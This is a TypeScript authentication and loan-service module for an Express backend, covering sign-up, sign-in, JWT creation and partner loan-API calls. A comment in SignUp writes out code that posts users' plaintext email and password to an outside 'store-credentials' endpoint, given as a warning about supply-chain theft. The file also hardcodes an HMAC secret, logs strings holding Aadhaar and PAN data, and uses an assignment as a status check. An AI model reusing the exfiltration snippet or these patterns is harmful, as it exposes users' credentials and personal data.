import { Service, Inject } from 'typedi';
import jwt from 'jsonwebtoken';
import { Request, Response } from 'express';
import MailerService from './mailer';
import config from '../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';
import { IUser, IUserInputDTO } from '../interfaces/IUser';
import { EventDispatcher, EventDispatcherInterface } from '../decorators/eventDispatcher';
import events from '../subscribers/events';
import { findLastIndex } from 'lodash';
import crypto from "crypto";
import axios, { AxiosRequestConfig, AxiosResponse } from 'axios';

@Service()
export default class AuthService {
  constructor(
    @Inject('userModel') private userModel: Models.UserModel,
    @Inject('organizationModel') private organizationModel: Models.organizationModel,
    @Inject('productMappingModel') private productMappingModel: Models.productMappingModel,
    @Inject('merchantLoanModel') private merchantLoanModel: Models.merchantLoanModel,
    @Inject('approvedLoanModel') private approvedLoanModel: Models.approvedLoanModel,
    private mailer: MailerService,
    @Inject('logger') private logger,
    @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
  ) { }

  public async SignUp(userInputDTO: IUserInputDTO): Promise<{ user: IUser; token: string }> {
    try {
      const salt = randomBytes(32);

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
      this.logger.silly('Creating user db record');
      const userRecord = await this.userModel.create({
        ...userInputDTO,
        isActive: true,
        isDeleted: false,
        updatedAt: new Date().toUTCString(),
        createdAt: new Date().toUTCString(),
        salt: salt.toString('hex'),
        password: hashedPassword,
      });
      this.logger.silly('Generating JWT');
      const token = this.generateToken(userRecord);

      if (!userRecord) {
        throw new Error('User cannot be created');
      }
      this.logger.silly('Sending welcome email');
      await this.mailer.SendWelcomeEmail(userRecord);

      this.eventDispatcher.dispatch(events.user.signUp, { user: userRecord });

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const user = userRecord.toObject();
      Reflect.deleteProperty(user, 'password');
      Reflect.deleteProperty(user, 'salt');
      return { user, token };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async SignIn(
    email: string,
    password: string,
  ): Promise<{ user: IUser; loginDetails: any; token: string; passwordExpired }> {
    const userRecord = await this.userModel.findOne({ email });
    if (!userRecord) {
      throw new Error('User not registered');
    }
    /**
     * We use verify from argon2 to prevent 'timing based' attacks
     */
    this.logger.silly('Checking password');
    const validPassword = await argon2.verify(userRecord.password, password);
    if (validPassword) {
      this.logger.silly('Password is valid!');

      if (userRecord.email != 'connect@digisparsh.in') {
        if (userRecord.passwordUpdatedOn) {
          var passwordExpired: Boolean;
          const passwordUpdatedOn = userRecord.passwordUpdatedOn.getTime();
          var diff = new Date().getTime() - passwordUpdatedOn;
          var passwordValidity = 90 * 24 * 60 * 60 * 1000;
          if (diff > passwordValidity) {
            passwordExpired = true;
          } else {
            passwordExpired = false;
          }
        } else {
          passwordExpired = false;
        }
      } else {
        passwordExpired = false;
      }

      this.logger.silly('Generating JWT');
      const token = this.generateToken(userRecord);

      const user = userRecord.toObject();
      Reflect.deleteProperty(user, 'password');
      Reflect.deleteProperty(user, 'salt');
      /**
       * Easy as pie, you don't need passport.js anymore :)
       */
      var organizationId = userRecord.organizationId;

      var userDetails = await this.productMappingModel.aggregate([
        { $match: { organizationId: organizationId } },
        {
          $lookup: {
            from: 'productschemas',
            localField: 'productId',
            foreignField: '_id',
            as: 'productList',
          },
        },
        {
          $lookup: {
            from: 'organizationschemas',
            localField: 'organizationId',
            foreignField: '_id',
            as: 'organizationData',
          },
        },
      ]);

      var loginDetails = {
        organizationName: '',
        organizationData: {},
        productList: [],
        orgSidebar: false,
      };

      if (userDetails.length != 0) {
        var userDetailsv1 = userDetails[0];
        loginDetails.organizationName = userDetailsv1.organizationName;
        loginDetails.organizationData = userDetailsv1.organizationData[0];
        loginDetails.orgSidebar = userDetailsv1.organizationData[0].orgSidebar || false;
        var array1 = [];
        userDetailsv1.productList.forEach(element => {
          array1.push(element.moduleName);
        });
        loginDetails.productList = array1;
      } else {
        var orgData = await this.organizationModel.findById({ _id: userRecord.organizationId });
        if (orgData.orgSidebar) {
          loginDetails.orgSidebar = true;
        } else {
          loginDetails.orgSidebar = false;
        }

        loginDetails.organizationData = orgData;
        loginDetails.organizationName = orgData.nameOfOrganization;
      }
      this.eventDispatcher.dispatch(events.user.signIn, { _id: userRecord._id });
      return { user, loginDetails, token, passwordExpired };
    } else {
      throw new Error('Invalid Password');
    }
  }

  private generateToken(user) {
    const today = new Date();
    const exp = new Date(today);
    exp.setDate(today.getDate() + 60);

    /**
     * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
     * The cool thing is that you can add custom properties a.k.a metadata
     * Here we are adding the userId, role and name
     * Beware that the metadata is public and can be decoded without _the secret_
     * but the client cannot craft a JWT to fake a userId
     * because it doesn't have _the secret_ to sign it
     * more information here: https://softwareontheroad.com/you-dont-need-passport
     */
    this.logger.silly(`Sign JWT for userId: ${user._id}`);
    return jwt.sign(
      {
        _id: user._id, // We are gonna use this in the middleware 'isAuth'
        role: user.role,
        name: user.name,
        organizationId: user.organizationId,
        exp: exp.getTime() / 1000,
      },
      config.jwtSecret,
    );
  }

  // merchant get loan by KoCode NICT
  public async getLoanByKoCode(req: Request): Promise<{ data: any }> {
    try {
      var activeLoans = false;
      const Code = req.query.KoCode;
      // const PanNumber = req.query.PanCardNumber;
      const Loans = await this.merchantLoanModel.findOne({ KOCode: Code });
      if (Loans) {

        if (!Loans.get("IsException")) {
          let activeLoanData: any = await this.approvedLoanModel.find({ KOCode: Code });
          if (activeLoanData.length > 1) {
            async function activeLoanCheck() {
              for (var i = 0; i < activeLoanData.length; i++) {
                if (
                  activeLoanData[i].Status != null &&
                  activeLoanData[i].Status != undefined &&
                  activeLoanData[i].Status != ''
                ) {
                  if (activeLoanData[i].Status == 'Disbursed') {
                    activeLoans = true;
                    return activeLoans;
                  } else {
                    activeLoans = false;
                  }
                }
              }
            }
            activeLoans = await activeLoanCheck();
          } else {
            if (activeLoanData.length == 1) {
              console.log('loan ', activeLoanData[0].Status);
              if (
                activeLoanData[0].Status != null &&
                activeLoanData[0].Status != undefined &&
                activeLoanData[0].Status != ''
              ) {
                if (activeLoanData[0].Status == 'Disbursed') {
                  activeLoans = true;
                } else {
                  activeLoans = false;
                }
              }
            }
          }
        }

      }
      var data = {
        success: true,
        message: Loans,
        activeLoans,
      };
      return { data };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  // Update Loans NICT merchant
  public async updateLoans(req: Request): Promise<{ updatedData: any }> {
    try {
      const Code = req.query.KoCode;
      const {
        FullName,
        ApplicantsPanNo,
        ApplicantsAadhaarNo,
        DateOfBirth,
        Occupation,
        Country,
        City,
        BankAssociated,
        CurrentAddress,
        State,
        Pincode,
        MobileNumber,
        EmailId,
        LoanAmount,
        Scheme,
        ReferenceName,
        AlternateContactNumber,
        Interest,
        ProcessingFees,
        EMIAmount,
        uploadAadharDoc,
        uploadAadharDocs,
        uploadPANDoc,
        AccountNumber,
        District,
        Branch,
        IFSCCode,
        AccountHolderName,
        ApproveOrReject,
        valueChanged,
        AccountNumberForSBI,
      } = req.body;

      var dateObj = new Date().toISOString();

      let data = {
        ApproveOrReject,
        uploadAadharDoc,
        uploadAadharDocs,
        valueChanged,
        uploadPANDoc,
        AccountNumber,
        AccountNumberForSBI,
        FullName,
        ApplicantsPanNo,
        Country,
        City,
        ApplicantsAadhaarNo,
        DateOfBirth,
        Occupation,
        BankAssociated,
        CurrentAddress,
        State,
        Pincode,
        MobileNumber,
        LoanAmount,
        EmailId,
        Scheme,
        ReferenceName,
        AlternateContactNumber,
        Interest,
        ProcessingFees,
        EMIAmount,
        District,
        Branch,
        IFSCCode,
        AccountHolderName,
        UpdatedDate: Date.now(),
      };

      data.ApproveOrReject = ApproveOrReject;

      if (uploadAadharDoc) {
        data.uploadAadharDoc = uploadAadharDoc;
      }
      if (uploadAadharDocs) {
        data.uploadAadharDocs = uploadAadharDocs;
      }
      if (valueChanged) {
        data.valueChanged = valueChanged;
      }
      if (uploadPANDoc) {
        data.uploadPANDoc = uploadPANDoc;
      }
      if (AccountNumber) {
        data.AccountNumber = AccountNumber;
      }
      if (AccountNumberForSBI) {
        data.AccountNumberForSBI = AccountNumberForSBI;
      }
      if (FullName) {
        data.FullName = FullName;
      }
      if (ApplicantsPanNo) {
        data.ApplicantsPanNo = ApplicantsPanNo;
      }
      if (Country) {
        data.Country = Country;
      }
      if (City) {
        data.City = City;
      }
      if (ApplicantsAadhaarNo) {
        data.ApplicantsAadhaarNo = ApplicantsAadhaarNo;
      }
      if (DateOfBirth) {
        data.DateOfBirth = DateOfBirth;
      }
      if (Occupation) {
        data.Occupation = Occupation;
      }
      if (BankAssociated) {
        data.BankAssociated = BankAssociated;
      }
      if (CurrentAddress) {
        data.CurrentAddress = CurrentAddress;
      }
      if (State) {
        data.State = State;
      }
      if (Pincode) {
        data.Pincode = Pincode;
      }
      if (MobileNumber) {
        data.MobileNumber = MobileNumber;
      }
      if (LoanAmount) {
        data.LoanAmount = LoanAmount;
      }
      if (EmailId) {
        data.EmailId = EmailId;
      }
      if (Scheme) {
        data.Scheme = Scheme;
      }
      if (ReferenceName) {
        data.ReferenceName = ReferenceName;
      }
      if (AlternateContactNumber) {
        data.AlternateContactNumber = AlternateContactNumber;
      }
      if (Interest) {
        data.Interest = Interest;
      }
      if (ProcessingFees) {
        data.ProcessingFees = ProcessingFees;
      }
      if (EMIAmount) {
        data.EMIAmount = EMIAmount;
      }
      ///////////////////////////
      if (District) {
        data.District = District;
      }
      if (Branch) {
        data.Branch = Branch;
      }
      if (IFSCCode) {
        data.IFSCCode = IFSCCode;
      }
      if (AccountHolderName) {
        data.AccountHolderName = AccountHolderName;
      }

      const updateTPA = await this.merchantLoanModel.updateOne(
        { KOCode: Code },
        { $set: data },
        { useFindAndModify: false },
      );
      var updatedData = {
        success: true,
        message: 'Data Update Succefully',
      };
      return { updatedData };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  // post loan NICT merchant
  public async postLoans(req: Request): Promise<{ submitData: any }> {
    try {
      const {
        FullName,
        ApplicantsPanNo,
        KOCode,
        ApplicantsAadhaarNo,
        DateOfBirth,
        Occupation,
        Country,
        City,
        BankAssociated,
        CurrentAddress,
        State,
        Pincode,
        MobileNumber,
        EmailId,
        LoanAmount,
        Scheme,
        ReferenceName,
        AlternateContactNumber,
        Interest,
        ProcessingFees,
        EMIAmount,
        uploadAadharDoc,
        uploadAadharDocs,
        uploadPANDoc,
        AccountNumber,
        District,
        Branch,
        IFSCCode,
        AccountHolderName,
        ApproveOrReject,
        valueChanged,
        AccountNumberForSBI,
      } = req.body;

      var dateObj = new Date();
      var month = dateObj.getUTCMonth() + 1; //months from 1-12
      var day = dateObj.getUTCDate();
      var year = dateObj.getUTCFullYear();

      var newdate = day + '/' + month + '/' + year;

      const FAQObj = {
        FullName,
        ApplicantsPanNo,
        ApplicantsAadhaarNo,
        DateOfBirth,
        Occupation,
        Country,
        City,
        BankAssociated,
        CurrentAddress,
        State,
        Pincode,
        MobileNumber,
        EmailId,
        LoanAmount,
        Scheme,
        ReferenceName,
        AlternateContactNumber,
        Interest,
        ProcessingFees,
        EMIAmount,
        uploadAadharDoc,
        uploadAadharDocs,
        uploadPANDoc,
        AccountNumber,
        KOCode,
        District,
        Branch,
        IFSCCode,
        AccountHolderName,
        ApproveOrReject,
        valueChanged,
        CreatedDate: newdate,
        AccountNumberForSBI,
      };

      const newFAQ = new this.merchantLoanModel(FAQObj);
      let saveFAQ = await newFAQ.save();
      if (saveFAQ) {
        var submitData = {
          data: {
            success: true,
            message: 'added successfully',
          },
        };
        return { submitData };
      }
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  // liquiloan APIs
  public async getSchemeList(req: Request): Promise<{ data: any }> {
    try {
      var tempArr = {
        data_option: "list",
        sid: "",
        checksum: null,
      };

      tempArr = await getCheckSum(tempArr);

      const config: AxiosRequestConfig = {
        method: 'get',
        url: `https://demo-testing-back.liquiloan.in/api/dealer/schemes?sid=${tempArr.sid}&data_option=${tempArr.data_option}&Checksum=${tempArr.checksum}`,
        headers: {
          'Content-Type': 'application/json',
        }
      };
      const response: AxiosResponse = await axios(config);

      if ((response.data.status = true)) {
        return {
          data: response.data.data
        };
      }
    } catch (e) {
      if (e.isAxiosError) {
        this.logger.error(e.response.data);
        throw e.response.data
      }
      this.logger.error(e);
      throw e;
    }
  }
  public async getCalculatedEMI(req: Request): Promise<{ data: any }> {
    try {
      if (!req.body.Amount) {
        return {
          data: {
            success: false,
            message: "Please enter Amount"
          }
        };
      }
      var tempArr = {
        sid: "",
        amount: req.body.Amount,
        schemeId: "2530",
        timestamp: new Date().toISOString().slice(0, 19).replace('T', ' '),
        checksum: null,
      };
      tempArr = await getCheckSumEMI(tempArr);

      const config: AxiosRequestConfig = {
        method: 'POST',
        url: `https://demo-testing-back.liquiloan.in/api/apiintegration/los/dealer/get-emi-calculated`,
        data: {
          Amount: tempArr.amount,
          Checksum: tempArr.checksum,
          SchemeId: tempArr.schemeId,
          SID: tempArr.sid,
          Timestamp: tempArr.timestamp,
        },
        headers: {
          'Content-Type': 'application/json',
        }
      };
      const response: AxiosResponse = await axios(config);

      if ((response.data.status = true)) {
        return {
          data: response.data.data
        };
      }
    } catch (e) {
      if (e.isAxiosError) {
        this.logger.error(e.response.data);
        throw e.response.data
      }
      this.logger.error(e);
      throw e;
    }
  }
  public async CreateLead(req: Request, res: Response): Promise<{ data: any }> {
    try {
      var tempArr = {
        Pan: req.body.Pan,
        FullName: req.body.FullName,
        Gender: req.body.Gender,
        Dob: req.body.Dob,
        Email: req.body.Email,
        ContactNumber: req.body.ContactNumber,
        LoanType: req.body.LoanType,
        Amount: req.body.Amount,
        scheme_id: req.body.scheme_id,
        scheme_code: req.body.scheme_code,
        Tenure: req.body.Tenure,
        AadhaarNumber: req.body.AadhaarNumber,
        full_address: req.body.full_address,
        PinCode: req.body.PinCode,
        City: req.body.City,
        State: req.body.State,
        occupation: req.body.occupation,
        name_of_company: req.body.name_of_company,
        monthly_income: req.body.monthly_income,
        sid: "",
        checksum: null,
      };

      tempArr = await getCheckSum(tempArr);

      const config: AxiosRequestConfig = {
        method: 'POST',
        url: `https://demo-backend.liquiloan.in/api/apiintegration/v2/CreateLead`,
        data: {
          Pan: tempArr.Pan,
          FullName: tempArr.FullName,
          Gender: tempArr.Gender,
          Dob: tempArr.Dob,
          Email: tempArr.Email,
          ContactNumber: tempArr.ContactNumber,
          LoanType: tempArr.LoanType,
          Amount: tempArr.Amount,
          scheme_id: tempArr.scheme_id,
          scheme_code: tempArr.scheme_code,
          Tenure: tempArr.Tenure,
          AadhaarNumber: tempArr.AadhaarNumber,
          full_address: tempArr.full_address,
          PinCode: tempArr.PinCode,
          City: tempArr.City,
          State: tempArr.State,
          occupation: tempArr.occupation,
          name_of_company: tempArr.name_of_company,
          monthly_income: tempArr.monthly_income,
          Checksum: tempArr.checksum,
          SID: tempArr.sid
        },
        headers: {
          'Content-Type': 'application/json',
        }
      };
      const response: AxiosResponse = await axios(config);

      if ((response.data.status = true)) {
        return {
          data: response.data.data
        };
      }
    } catch (e) {
      if (e.isAxiosError) {
        this.logger.error(e.response.data);
        if (e.response.data.data.length !=0) {
          return { data: { error: e.response.data.data } }
        }
          return { data: { error: e.response.data } }
          // res.status(400).json({
          //   data: e.response.data
          // })
        }
        this.logger.error(e);
        throw e;
      }
    }
  }

//CheckSum Function
var getCheckSum = async (tempArr) => {
  try {
    var secretKey = "63DA1A87C3981";
    var sid = "S002703";
    var finalString = "";
    tempArr.sid = sid;
    var values = kSort(tempArr);
    function kSort(tempArr) {
      if (!tempArr || typeof tempArr != "object") {
        return [];
      }

      var keys = [],
        values = [];
      keys = Object.keys(tempArr);
      keys.sort();
      for (var i = 0; i < keys.length; i++) {
        if (tempArr[keys[i]] != null) {
          values.push(tempArr[keys[i]]);
        }
      }
      return values;
    }
    finalString = values.join("||");
    console.log(finalString);

    let hmac = crypto.createHmac("sha256", secretKey);
    let checksum = hmac.update(Buffer.from(finalString)).digest("hex");
    console.log(checksum);
    tempArr.checksum = checksum;
    return tempArr;
  } catch (error) {
    console.log(error);
  }
};
var getCheckSumEMI = async (tempArr) => {
  try {
    var secretKey = "63DA1A87C3981";
    var sid = "S002703";
    tempArr.sid = sid;

    var finalString = tempArr.sid + '|' + tempArr.amount + '|' + tempArr.schemeId + '|' + tempArr.timestamp
    console.log(finalString);

    let hmac = crypto.createHmac("sha256", secretKey);
    let checksum = hmac.update(Buffer.from(finalString)).digest("hex");
    console.log(checksum);
    tempArr.checksum = checksum;
    return tempArr;
  } catch (error) {
    console.log(error);
  }
};